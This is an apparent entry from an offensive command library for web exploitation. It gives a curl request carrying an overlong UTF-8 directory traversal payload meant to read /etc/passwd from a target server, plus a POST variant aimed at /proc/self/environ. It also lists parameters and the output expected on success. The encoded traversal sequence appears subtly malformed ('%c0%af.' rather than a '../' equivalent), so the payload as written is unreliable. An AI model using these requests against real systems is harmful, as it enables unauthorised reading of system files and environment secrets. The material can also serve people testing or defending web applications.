---
id: 6d115d1a-0c00-4519-9e42-765dc868286a
name: curl-utf8-directory-traversal
type: command
executor: bash
data: >-
  curl -X GET
  "http://$_TARGET_URL?file=%c0%af.%c0%af.%c0%af.%c0%af.%c0%afetc%2fpasswd" -v
output: null
created_at: '2023-04-06T03:56:36.110238+00:00'
updated_at: '2023-04-10T20:24:20.658852+00:00'
platforms:
  - Linux
  - macOS
  - Windows
tags:
  - web-exploitation
  - directory-traversal
verified: true
validated: true
---

# curl-utf8-directory-traversal

## Command

```bash
curl -X GET "http://$_TARGET_URL?file=%c0%af.%c0%af.%c0%af.%c0%af.%c0%afetc%2fpasswd" -v
```

## Description

This command uses curl to send an HTTP GET request to a vulnerable web endpoint, injecting a UTF-8 overlong encoded directory traversal payload to access restricted files like /etc/passwd. It is used in web exploitation to bypass path normalization filters.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_URL | The base URL of the vulnerable endpoint (e.g., target.com/download) | Yes |
| %c0%af | Overlong UTF-8 encoding for '/' (repeat for each '../' level) | Yes |
| etc%2fpasswd | URL-encoded target filename (/etc/passwd) | Yes |
| -X GET | Specifies HTTP method | No (default) |
| -v | Verbose mode to show request/response details | No |

## Examples

### Basic Usage

```bash
curl -X GET "http://example.com/file?path=%c0%af.%c0%afetc%2fpasswd"
```

### Advanced Usage

```bash
curl -X POST -d "file=%c0%af.%c0%af.%c0%afproc%2fself%2fenviron" http://example.com/upload -H "Content-Type: application/x-www-form-urlencoded"
```

## Expected Output

If successful, the response body contains the target file's contents, e.g.:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

HTTP status 200 OK with file data indicates success. Errors like 403 or 404 suggest filtering or incorrect path.

## Related

- [[procedures/Basic-Directory-Traversal-Using-UTF-8-Unicode-Encoding]]
- [[commands/curl-basic-file-request]]
